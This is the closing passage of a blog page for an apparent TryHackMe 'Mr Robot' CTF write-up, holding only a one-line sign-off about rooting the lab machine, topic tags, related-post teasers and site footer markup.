+</span></pre></table></code></div></div><p>Great, and just like that, we have rooted this machine, hope you enjoyed it, see you in the next machine.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/reverse-shell/" class="post-tag no-text-decoration" >reverse-shell</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >wordpress</a> <a href="/tags/bruteforce/" class="post-tag no-text-decoration" >bruteforce</a> <a href="/tags/hydra/" class="post-tag no-text-decoration" >hydra</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >suid</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/crack/" class="post-tag no-text-decoration" >crack</a> <a href="/tags/gobuster/" class="post-tag no-text-decoration" >gobuster</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe+-+Mr+Robot+CTF+-+Nasrallah&url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FMrRobotCtf%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe+-+Mr+Robot+CTF+-+Nasrallah&u=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FMrRobotCtf%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FMrRobotCtf%2F&text=TryHackMe+-+Mr+Robot+CTF+-+Nasrallah" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FMrRobotCtf%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Preignition/">HackTheBox - Preignition</a><li><a href="/posts/HTB-Appointment/">HackTheBox - Appointment</a><li><a href="/posts/HTB-Sequel/">HackTheBox - Sequel</a><li><a href="/posts/HTB-Responder/">HackTheBox - Responder</a><li><a href="/posts/blunder/">HackTheBox - Blunder</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/hackthissite/">hackthissite</a> <a class="post-tag" href="/tags/hts/">hts</a> <a class="post-tag" href="/tags/basic/">basic</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/html/">html</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/RootMe/"><div class="card-body"> <em class="small" data-ts="1641168000" data-df="ll" > Jan 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - RootMe</h3><div class="text-muted small"><p> Hello l33ts, I hope you are doing well. Today we are going to look at RootMe, a medium machine from TryHackMe. Let’s start. Description A ctf for beginners, can you root me? Enumeration nma...</p></div></div></a></div><div class="card"> <a href="/posts/Pickle-Rick/"><div class="card-body"> <em class="small" data-ts="1640563200" data-df="ll" > Dec 27, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Pickle Rick</h3><div class="text-muted small"><p> Hello l33ts, I hope you are doing well. Today we are going to look at Pickle Rick from TryHackMe. Description This Rick and Morty themed challenge requires you to exploit a webserver to find...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnversity/"><div class="card-body"> <em class="small" data-ts="1641513600" data-df="ll" > Jan 7, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Vulnversity</h3><div class="text-muted small"><p> Hello l33ts, I hope you are doing well. Today we are going to look at Vulnversity, an easy machine from TryHackMe, let’s dive into it. Description Learn about active recon, web app attacks a...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/Pickle-Rick/" class="btn btn-outline-primary" prompt="Newer"><p>TryHackMe - Pickle Rick</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/NasrallahBaadi">NasrallahBaadi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/hackthissite/">hackthissite</a> <a class="post-tag" href="/tags/hts/">hts</a> <a class="post-tag" href="/tags/basic/">basic</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/html/">html</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
